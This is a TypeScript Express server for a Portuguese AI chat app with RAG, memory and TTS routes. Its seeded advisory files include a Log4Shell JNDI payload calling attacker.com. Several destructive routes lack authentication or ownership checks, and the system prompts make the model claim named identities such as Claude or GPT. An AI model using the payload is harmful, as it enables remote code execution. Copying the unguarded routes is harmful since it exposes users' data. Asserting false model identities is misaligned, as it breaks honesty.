import express from "express";
import path from "path";
import * as fs from "fs";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI } from "@google/genai";
import dotenv from "dotenv";
import { AIRouter } from "./src/ai/router/AIRouter";
import { sharedKnowledgeBase } from "./src/ai/rag/KnowledgeBase";
import { sharedMemoryBase } from "./src/ai/rag/MemoryBase";
import { sharedEvaluator } from "./src/ai/utils/Evaluator";

// Database and authentication imports
import { db } from "./src/db/index.ts";
import { chatSessions as chatSessionsTable } from "./src/db/schema.ts";
import { getOrCreateUser } from "./src/db/users.ts";
import { adminAuth } from "./src/lib/firebase-admin.ts";
import { eq, desc } from "drizzle-orm";


dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Use JSON middleware
  app.use(express.json());

  // Initialize Gemini SDK with User-Agent header for telemetry
  const ai = new GoogleGenAI({
    apiKey: process.env.GEMINI_API_KEY,
    httpOptions: {
      headers: {
        'User-Agent': 'aistudio-build',
      }
    }
  });

  // Instantiate the Multi-Provider AI Router
  const router = new AIRouter();

  // API route for chat
  app.post("/api/chat", async (req, res) => {
    try {
      const { messages, model, webSearch, confirmedTools, deniedTools } = req.body;

      if (!messages || !Array.isArray(messages) || messages.length === 0) {
        return res.status(400).json({ error: "Mensagens inválidas ou vazias." });
      }

      // Build specific system instruction based on model selection
      let systemInstruction = "Você é um assistente útil e preciso.";
      if (model) {
        const lowerModel = model.toLowerCase();
        if (lowerModel.includes("claude")) {
          systemInstruction = "Você é o Claude, um assistente refinado, altamente analítico, preciso e muito prestativo. Responda em português de forma natural e profissional.";
        } else if (lowerModel.includes("gpt")) {
          systemInstruction = "Você é o GPT, um assistente ágil, direto, prestativo e simpático. Responda em português de forma clara e objetiva.";
        } else if (lowerModel.includes("gemini")) {
          systemInstruction = "Você é o Gemini, o modelo de inteligência artificial avançado do Google. Responda em português demonstrando alta capacidade de raciocínio.";
        } else if (lowerModel.includes("llama")) {
          systemInstruction = "Você é o Llama, assistente potente e eficiente da Meta AI. Responda em português de forma concisa e correta.";
        } else if (lowerModel.includes("deepseek")) {
          systemInstruction = "Você é o DeepSeek, um assistente de IA extremamente inteligente e rápido. Responda em português.";
        } else if (lowerModel.includes("mistral")) {
          systemInstruction = "Você é o Mistral, um assistente preciso e elegante desenvolvido pela Mistral AI. Responda em português.";
        }
      }

      // Convert messages to Router format
      const formattedMessages = messages
        .filter(m => m.content && m.content.trim() !== "")
        .map(m => ({
          role: m.role === "assistant" || m.role === "model" ? "assistant" as const : "user" as const,
          content: m.content
        }));

      // Route the request using AIRouter
      const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
      const ipString = Array.isArray(clientIp) ? clientIp[0] : clientIp;

      let userId: string | undefined;
      const authHeader = req.headers.authorization;
      if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.split('Bearer ')[1];
        try {
          const decodedToken = await adminAuth.verifyIdToken(token);
          userId = decodedToken.uid;
          console.log(`[API] Authed chat request for user: ${userId}`);
        } catch (e: any) {
          console.warn("[API] Optional token verification failed in /api/chat:", e.message);
        }
      }

      const routerResult = await router.route(model || "auto", {
        messages: formattedMessages,
        webSearch,
        systemInstruction,
        temperature: 0.7,
        confirmedTools,
        deniedTools
      }, ipString, userId);

      // Log interaction in Evaluator
      const toolsUsed = routerResult.agentSteps ? routerResult.agentSteps.map((step: any) => step.tool) : [];
      const userPrompt = formattedMessages[formattedMessages.length - 1]?.content || "";
      const evalId = sharedEvaluator.registrar_interacao(
        userPrompt,
        routerResult.text || "",
        toolsUsed,
        routerResult.providerName || "desconhecido",
        (routerResult.latencyMs || 0) / 1000
      );

      return res.json({
        text: routerResult.text,
        sources: routerResult.sources || [],
        providerName: routerResult.providerName,
        modelUsed: routerResult.modelUsed,
        usage: routerResult.usage,
        latencyMs: routerResult.latencyMs,
        estimatedCostUsd: routerResult.estimatedCostUsd,
        cached: routerResult.metrics.cached,
        fallbackChain: routerResult.fallbackChain,
        agentSteps: routerResult.agentSteps,
        requiresConfirmation: routerResult.requiresConfirmation,
        toolToConfirm: routerResult.toolToConfirm,
        evalId
      });

    } catch (error: any) {
      console.error("Erro na API de chat do AIRouter:", error);
      const errorString = error ? (error.message || JSON.stringify(error)) : "";
      
      if (
        errorString.includes("429") ||
        errorString.includes("RESOURCE_EXHAUSTED") ||
        errorString.toLowerCase().includes("quota") ||
        errorString.toLowerCase().includes("rate limit") ||
        errorString.toLowerCase().includes("exceeded")
      ) {
        return res.status(429).json({
          error: "⚠️ **Limite de Cota Excedido (Erro 429 - RESOURCE_EXHAUSTED)**\n\nAs cotas para esta requisição de IA foram atingidas.\n\n**Como resolver isso:**\n1. **Aguarde 1 minuto**: As cotas de requisição gratuita costumam reiniciar a cada minuto.\n2. **Altere o modelo**: Tente mudar de provedor no menu lateral para desviar da sobrecarga de cota do modelo atual.\n3. **Verifique suas chaves de API**: Certifique-se de que configurou chaves de API válidas no painel do AI Studio para obter limites robustos e estáveis."
        });
      }

      return res.status(500).json({
        error: error.message || "Erro interno ao processar sua solicitação no servidor de chat multimodal."
      });
    }
  });

  // API route for metrics dashboard
  app.get("/api/metrics", (req, res) => {
    res.json(router.getMetrics());
  });

  // API route for circuit breakers state
  app.get("/api/circuit-breakers", (req, res) => {
    res.json(router.getCircuitBreakerStates());
  });

  // API route to toggle simulated failure for a provider for testing purposes
  app.post("/api/circuit-breakers/toggle-failure", (req, res) => {
    const { providerId, active } = req.body;
    if (!providerId) {
      return res.status(400).json({ error: "O ID do provedor é obrigatório." });
    }
    router.toggleSimulatedFailure(providerId, !!active);
    return res.json({ 
      success: true, 
      providerId, 
      simulatedFailure: router.isSimulatedFailure(providerId),
      message: `Simulação de falha para ${providerId} ${active ? "ATIVADA" : "DESATIVADA"}` 
    });
  });

  // API route to get TTS provider configuration status and presets
  app.get("/api/tts/config", (req, res) => {
    res.json({
      elevenlabs: {
        configured: !!process.env.ELEVENLABS_API_KEY,
        voices: [
          { id: "21m00Tcm4TlvDq8ikWAM", name: "Rachel (Feminina, Natural)" },
          { id: "pNInz6obpgq9S3J7m73y", name: "Adam (Masculina, Profunda)" },
          { id: "ErXwobaYiN019PkySvjV", name: "Antoni (Masculina, Calorosa)" },
          { id: "z9fAnHeC5833kWme0m9d", name: "Glinda (Feminina, Suave)" }
        ]
      },
      google_cloud: {
        configured: !!process.env.GOOGLE_TTS_API_KEY,
        voices: [
          { id: "pt-BR-Neural2-C", name: "Google Neural2-C (Feminina BR)" },
          { id: "pt-BR-Neural2-B", name: "Google Neural2-B (Masculina BR)" },
          { id: "pt-BR-Wavenet-A", name: "Google Wavenet-A (Feminina BR)" },
          { id: "pt-BR-Wavenet-B", name: "Google Wavenet-B (Masculina BR)" }
        ]
      }
    });
  });

  // Proxy API route to synthesize text to audio using external high-fidelity providers
  app.post("/api/tts", async (req, res) => {
    try {
      const { text, provider, voiceId, pitch } = req.body;
      if (!text || !text.trim()) {
        return res.status(400).json({ error: "Texto para síntese é obrigatório." });
      }

      const cleanText = text.trim();

      if (provider === "elevenlabs") {
        const apiKey = process.env.ELEVENLABS_API_KEY;
        if (!apiKey) {
          return res.status(400).json({ error: "Chave de API do ElevenLabs não configurada no servidor." });
        }

        const activeVoiceId = voiceId || "21m00Tcm4TlvDq8ikWAM";
        const response = await fetch(`https://api.elevenlabs.io/v1/text-to-speech/${activeVoiceId}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "xi-api-key": apiKey
          },
          body: JSON.stringify({
            text: cleanText,
            model_id: "eleven_multilingual_v2",
            voice_settings: {
              stability: 0.5,
              similarity_boost: 0.75
            }
          })
        });

        if (!response.ok) {
          const errorText = await response.text();
          console.error("Erro ElevenLabs API:", errorText);
          return res.status(response.status).json({ error: `Erro ElevenLabs: ${errorText}` });
        }

        const audioBuffer = await response.arrayBuffer();
        res.setHeader("Content-Type", "audio/mpeg");
        return res.send(Buffer.from(audioBuffer));

      } else if (provider === "google_cloud") {
        const apiKey = process.env.GOOGLE_TTS_API_KEY;
        if (!apiKey) {
          return res.status(400).json({ error: "Chave de API do Google Cloud TTS não configurada no servidor." });
        }

        const activeVoiceId = voiceId || "pt-BR-Neural2-C";
        const gttsPitch = pitch !== undefined ? (pitch - 1.0) * 20.0 : 0.0;

        const response = await fetch(`https://texttospeech.googleapis.com/v1/text:synthesize?key=${apiKey}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            input: { text: cleanText },
            voice: {
              languageCode: "pt-BR",
              name: activeVoiceId
            },
            audioConfig: {
              audioEncoding: "MP3",
              pitch: gttsPitch
            }
          })
        });

        if (!response.ok) {
          const errorText = await response.text();
          console.error("Erro Google TTS API:", errorText);
          return res.status(response.status).json({ error: `Erro Google TTS: ${errorText}` });
        }

        const data = await response.json() as { audioContent?: string; error?: any };
        if (data.error) {
          return res.status(400).json({ error: data.error.message || "Erro desconhecido Google Cloud TTS" });
        }

        if (!data.audioContent) {
          return res.status(500).json({ error: "Resposta do Google Cloud TTS sem conteúdo de áudio." });
        }

        const audioBuffer = Buffer.from(data.audioContent, "base64");
        res.setHeader("Content-Type", "audio/mpeg");
        return res.send(audioBuffer);

      } else {
        return res.status(400).json({ error: "Provedor de TTS inválido ou não suportado no servidor." });
      }
    } catch (error: any) {
      console.error("Erro na rota /api/tts:", error);
      return res.status(500).json({ error: error.message || "Erro interno ao processar síntese de voz." });
    }
  });

  // API route to clear cache
  app.post("/api/cache/clear", (req, res) => {
    router.clearCache();
    res.json({ success: true, message: "Cache limpo com sucesso!" });
  });

  // --- START OF RAG (BASE DE CONHECIMENTO) API ROUTES ---

  // Helper function to bootstrap documents directory with real security articles
  function bootstrapDocumentosDirectory() {
    const dirPath = "./documentos";
    try {
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }

      const sampleFiles = [
        {
          name: "cve_2021_44228_log4shell.txt",
          content: `Vulnerabilidade: CVE-2021-44228 (Log4Shell)\nGravidade: CRÍTICA (CVSS 10.0)\nComponente Afetado: Apache Log4j2 (versões 2.0-beta9 a 2.14.1)\nTipo: Execução Remota de Código (RCE) via JNDI injection.\n\nDescrição Detalhada:\nA falha ocorre porque o Log4j2 processa expressões no formato \${jndi:ldap://attacker.com/a} contidas em logs. Quando um servidor vulnerável registra uma mensagem contendo esse padrão, ele faz uma consulta JNDI/LDAP ao servidor do invasor, que pode devolver uma classe Java maliciosa que será baixada e executada localmente pelo servidor de aplicação.\n\nAplicações Práticas de Ataque:\nGeralmente, atacantes injetam a payload no cabeçalho User-Agent HTTP, em campos de login ou parâmetros de busca que são passados para a biblioteca de log.\n\nRemediação recomendada:\n1. Atualizar para Apache Log4j 2.15.0 ou superior (versões recentes removem lookups JNDI por padrão).\n2. Como mitigação temporária em sistemas legados, definir a propriedade do sistema 'log4j2.formatMsgNoLookups' como 'true', ou remover a classe JndiLookup do arquivo JAR.`
        },
        {
          name: "cve_2024_3094_xz_backdoor.txt",
          content: `Vulnerabilidade: CVE-2024-3094 (Backdoor no XZ Utils)\nGravidade: CRÍTICA (CVSS 10.0)\nComponente Afetado: Biblioteca liblzma presente no XZ Utils (versões 5.6.0 e 5.6.1)\nTipo: Backdoor Oculto (Acesso Root Não Autorizado via SSH)\n\nDescrição Detalhada:\nUm desenvolvedor malicioso (identificado como Jia Tan) inseriu um backdoor altamente sofisticado e ofuscado dentro das etapas de build do pacote do XZ Utils. Durante a compilação do pacote em distribuições Linux selecionadas (como Debian/Fedora instáveis), o script injeta um código binário modificado na biblioteca liblzma. Como o daemon SSH (sshd) em muitas distribuições se vincula à libsystemd (que por sua vez importa a liblzma), o backdoor consegue monitorar o handshake SSH.\n\nAções de Exploração:\nSe o invasor enviar uma chave específica de assinatura durante o login do SSH, o backdoor intercepta a chamada e executa código arbitrário com privilégios de root, burlando totalmente os mecanismos de autenticação normais.\n\nRemediação recomendada:\nFazer o downgrade do XZ Utils imediatamente para uma versão anterior conhecida como segura (como a versão 5.4.6) ou atualizar para a versão de patch disponibilizada pela distribuição Linux.`
        },
        {
          name: "owasp_top10_2025_resumo.txt",
          content: `OWASP Top 10 - Melhores Práticas de Segurança em Aplicações Web\n\n1. Controle de Acesso Quebrado (Broken Access Control):\nGaranta que os usuários não possam acessar recursos fora de suas permissões. Aplique princípios de privilégio mínimo e valide a autorização no servidor de forma consistente.\n\n2. Falhas Criptográficas (Cryptographic Failures):\nProteja dados em trânsito e em repouso. Use protocolos seguros como TLS 1.3, evite algoritmos fracos (como MD5 ou SHA1) e faça gerenciamento adequado de chaves secretas.\n\n3. Injeção (Injection):\nEvite injeções de SQL, de comandos de sistema ou de templates. Sempre use APIs que separam dados de comandos (como Prepared Statements) e faça validação de tipo de dados de entrada.\n\n4. Design Inseguro (Insecure Design):\nA segurança deve ser pensada desde o início (Security by Design). Utilize modelagem de ameaças e padrões de design seguros antes de escrever o código.\n\n5. Configuração Incorreta de Segurança (Security Misconfiguration):\nMantenha sistemas atualizados, desative recursos desnecessários e use cabeçalhos de segurança HTTP apropriados (CSP, HSTS, X-Frame-Options).`
        }
      ];

      for (const file of sampleFiles) {
        const fullPath = path.join(dirPath, file.name);
        if (!fs.existsSync(fullPath)) {
          fs.writeFileSync(fullPath, file.content, "utf-8");
          console.log(`[RAG Bootstrap] Created sample document: ${fullPath}`);
        }
      }
    } catch (e) {
      console.error("[RAG Bootstrap] Error during directory bootstrapping:", e);
    }
  }

  // Run document bootstrapping on startup
  bootstrapDocumentosDirectory();

  // Route to get RAG metrics and ingested sources list
  app.get("/api/rag/metrics", (req, res) => {
    try {
      const metrics = sharedKnowledgeBase.getMetrics();
      res.json({
        success: true,
        metrics
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao carregar métricas da Base de Conhecimento." });
    }
  });

  // Route to search inside RAG (Base de Conhecimento)
  app.post("/api/rag/search", async (req, res) => {
    try {
      const { query, topK } = req.body;
      if (!query || !query.trim()) {
        return res.status(400).json({ error: "A pergunta/query para busca é obrigatória." });
      }

      const results = await sharedKnowledgeBase.search(query, topK || 4);
      res.json({
        success: true,
        query,
        results
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao buscar na Base de Conhecimento." });
    }
  });

  // Route to ingest text content manually
  app.post("/api/rag/ingest", async (req, res) => {
    try {
      const { text, source } = req.body;
      if (!text || !text.trim()) {
        return res.status(400).json({ error: "O texto para ingestão é obrigatório." });
      }
      const cleanSource = (source || "input_manual").trim();

      const chunkCount = await sharedKnowledgeBase.ingestText(text, cleanSource);
      res.json({
        success: true,
        message: `Ingestão realizada com sucesso. O texto foi dividido em ${chunkCount} chunks indexados.`,
        chunksCreated: chunkCount,
        source: cleanSource
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao realizar ingestão de texto." });
    }
  });

  // Route to delete a source from RAG
  app.delete("/api/rag/source", (req, res) => {
    try {
      const { source } = req.body;
      if (!source) {
        return res.status(400).json({ error: "O nome da fonte a ser deletada é obrigatório." });
      }

      const deleted = sharedKnowledgeBase.deleteBySource(source);
      res.json({
        success: true,
        deleted,
        message: deleted 
          ? `Documento '${source}' e todos os seus chunks associados foram excluídos.` 
          : `Nenhum chunk encontrado para a fonte '${source}'.`
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao excluir fonte." });
    }
  });

  // Route to scan the whole "./documentos" folder and ingest its content
  app.post("/api/rag/ingest-directory", async (req, res) => {
    try {
      const dirPath = "./documentos";
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }

      const files = fs.readdirSync(dirPath);
      let filesIngested = 0;
      let totalChunksCreated = 0;

      for (const file of files) {
        if (file.endsWith(".txt") || file.endsWith(".md")) {
          const filePath = path.join(dirPath, file);
          const content = fs.readFileSync(filePath, "utf-8");
          
          // Clear previous chunks from this file if any, to avoid duplicate chunks on re-ingestion
          sharedKnowledgeBase.deleteBySource(file);

          const chunksCount = await sharedKnowledgeBase.ingestText(content, file);
          if (chunksCount > 0) {
            filesIngested++;
            totalChunksCreated += chunksCount;
          }
        }
      }

      res.json({
        success: true,
        message: `Pasta './documentos' escaneada. Ingeridos ${filesIngested} arquivos (.txt/.md), gerando ${totalChunksCreated} chunks de conhecimento.`,
        filesProcessed: filesIngested,
        chunksCreated: totalChunksCreated
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao escanear e ingerir a pasta de documentos." });
    }
  });

  // Route to clear the entire knowledge base
  app.post("/api/rag/clear", (req, res) => {
    try {
      sharedKnowledgeBase.clear();
      res.json({
        success: true,
        message: "Base de Conhecimento (RAG) limpa por completo com sucesso."
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao limpar Base de Conhecimento." });
    }
  });

  // --- END OF RAG (BASE DE CONHECIMENTO) API ROUTES ---

  // --- START OF LONG TERM AGENT MEMORY AND CHAT PERSISTENCE API ROUTES (SQL BACKED) ---

  // Synchronize user profile on login
  app.post("/api/users/sync", async (req, res) => {
    try {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized: Missing token' });
      }
      const token = authHeader.split('Bearer ')[1];
      const decodedToken = await adminAuth.verifyIdToken(token);
      
      const user = await getOrCreateUser(decodedToken.uid, decodedToken.email || "");
      res.json({ success: true, user });
    } catch (error: any) {
      console.error("[API] Error syncing user:", error);
      res.status(500).json({ error: error.message || "Failed to synchronize user profile" });
    }
  });

  // Get all chat sessions for the logged in user
  app.get("/api/chat/sessions", async (req, res) => {
    try {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized: Missing token' });
      }
      const token = authHeader.split('Bearer ')[1];
      const decodedToken = await adminAuth.verifyIdToken(token);

      const rows = await db.select()
        .from(chatSessionsTable)
        .where(eq(chatSessionsTable.userId, decodedToken.uid))
        .orderBy(desc(chatSessionsTable.createdAt));

      // Return in the exact same format the frontend expects: ChatSession[]
      const formattedSessions = rows.map(r => ({
        id: r.id,
        title: r.title,
        createdAt: r.createdAt.toISOString(),
        messages: r.messages
      }));

      res.json({ success: true, sessions: formattedSessions });
    } catch (error: any) {
      console.error("[API] Error fetching chat sessions:", error);
      res.status(500).json({ error: error.message || "Failed to fetch chat sessions" });
    }
  });

  // Create or update a chat session
  app.post("/api/chat/sessions", async (req, res) => {
    try {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized: Missing token' });
      }
      const token = authHeader.split('Bearer ')[1];
      const decodedToken = await adminAuth.verifyIdToken(token);

      const { id, title, messages } = req.body;
      if (!id || !title) {
        return res.status(400).json({ error: "Missing required fields (id, title)" });
      }

      await db.insert(chatSessionsTable)
        .values({
          id,
          userId: decodedToken.uid,
          title,
          messages: messages || [],
          createdAt: new Date()
        })
        .onConflictDoUpdate({
          target: chatSessionsTable.id,
          set: {
            title,
            messages: messages || []
          }
        });

      res.json({ success: true });
    } catch (error: any) {
      console.error("[API] Error saving chat session:", error);
      res.status(500).json({ error: error.message || "Failed to save chat session" });
    }
  });

  // Delete a chat session
  app.delete("/api/chat/sessions/:id", async (req, res) => {
    try {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized: Missing token' });
      }
      const token = authHeader.split('Bearer ')[1];
      const decodedToken = await adminAuth.verifyIdToken(token);

      const { id } = req.params;

      await db.delete(chatSessionsTable)
        .where(eq(chatSessionsTable.id, id));

      res.json({ success: true });
    } catch (error: any) {
      console.error("[API] Error deleting chat session:", error);
      res.status(500).json({ error: error.message || "Failed to delete chat session" });
    }
  });

  // Route to list all memory facts
  app.get("/api/memory/list", async (req, res) => {
    try {
      let uid: string | undefined;
      const authHeader = req.headers.authorization;
      if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.split('Bearer ')[1];
        try {
          const decodedToken = await adminAuth.verifyIdToken(token);
          uid = decodedToken.uid;
        } catch (e) {}
      }

      const facts = await sharedMemoryBase.getAllFactsAsync(uid);
      res.json({
        success: true,
        facts
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao carregar lista de memórias." });
    }
  });

  // Route to save a new memory fact
  app.post("/api/memory/save", async (req, res) => {
    try {
      const { text, category } = req.body;
      if (!text || !text.trim()) {
        return res.status(400).json({ error: "O texto da memória é obrigatório." });
      }

      let uid: string | undefined;
      const authHeader = req.headers.authorization;
      if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.split('Bearer ')[1];
        try {
          const decodedToken = await adminAuth.verifyIdToken(token);
          uid = decodedToken.uid;
        } catch (e) {}
      }

      const id = await sharedMemoryBase.saveFact(text.trim(), category || "geral", uid);
      res.json({
        success: true,
        message: "Memória salva com sucesso!",
        id
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao salvar nova memória." });
    }
  });

  // Route to search inside agent memory
  app.post("/api/memory/search", async (req, res) => {
    try {
      const { query, topK } = req.body;
      if (!query || !query.trim()) {
        return res.status(400).json({ error: "A pergunta/query para busca de memória é obrigatória." });
      }

      let uid: string | undefined;
      const authHeader = req.headers.authorization;
      if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.split('Bearer ')[1];
        try {
          const decodedToken = await adminAuth.verifyIdToken(token);
          uid = decodedToken.uid;
        } catch (e) {}
      }

      const results = await sharedMemoryBase.searchRelevantFacts(query, topK || 5, 0.35, uid);
      res.json({
        success: true,
        query,
        results
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao pesquisar na memória do agente." });
    }
  });

  // Route to delete a single fact
  app.delete("/api/memory/fact", async (req, res) => {
    try {
      const { id } = req.body;
      if (!id) {
        return res.status(400).json({ error: "O ID da memória a ser excluída é obrigatório." });
      }

      const deleted = await sharedMemoryBase.deleteFact(id);
      res.json({
        success: true,
        deleted,
        message: deleted
          ? `Fato de memória '${id}' excluído com sucesso.`
          : `Nenhum fato encontrado com o ID '${id}'.`
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao excluir memória." });
    }
  });

  // Route to clear entire memory base
  app.post("/api/memory/clear", async (req, res) => {
    try {
      let uid: string | undefined;
      const authHeader = req.headers.authorization;
      if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.split('Bearer ')[1];
        try {
          const decodedToken = await adminAuth.verifyIdToken(token);
          uid = decodedToken.uid;
        } catch (e) {}
      }

      sharedMemoryBase.clear(uid);
      res.json({
        success: true,
        message: "Memória de longo prazo do agente limpa por completo com sucesso."
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao limpar memória do agente." });
    }
  });

  // --- END OF LONG TERM AGENT MEMORY AND CHAT PERSISTENCE API ROUTES ---


  // --- START OF AGENT EVALUATION API ROUTES ---

  // Route to log user feedback (Thumbs up/down + text correction)
  app.post("/api/eval/feedback", async (req, res) => {
    try {
      const { evalId, approved, correction } = req.body;
      if (!evalId) {
        return res.status(400).json({ error: "O ID da avaliação (evalId) é obrigatório." });
      }

      const success = await sharedEvaluator.registrar_feedback(evalId, !!approved, correction);
      if (success) {
        res.json({
          success: true,
          message: approved
            ? "Interação marcada como aprovada!"
            : "Interação marcada como reprovada. Correção inserida na memória do agente com sucesso!"
        });
      } else {
        res.status(404).json({ error: "Avaliação não encontrada." });
      }
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao registrar feedback de avaliação." });
    }
  });

  // Route to get evaluation metrics/quality reports
  app.get("/api/eval/metrics", (req, res) => {
    try {
      const report = sharedEvaluator.relatorio_qualidade();
      res.json(report);
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao carregar relatório de qualidade." });
    }
  });

  // Route to get list of all recorded evaluations
  app.get("/api/eval/interactions", (req, res) => {
    try {
      res.json(sharedEvaluator.getAllInteractions());
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao obter histórico de avaliações." });
    }
  });

  // Route to export dataset of corrections as JSONL
  app.post("/api/eval/export", (req, res) => {
    try {
      const count = sharedEvaluator.exportar_dataset_correcoes();
      res.json({
        success: true,
        count,
        message: `Dataset exportado com sucesso contendo ${count} correções em './dataset_correcoes.jsonl'.`
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Erro ao exportar dataset de correções." });
    }
  });

  // --- END OF AGENT EVALUATION API ROUTES ---


  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
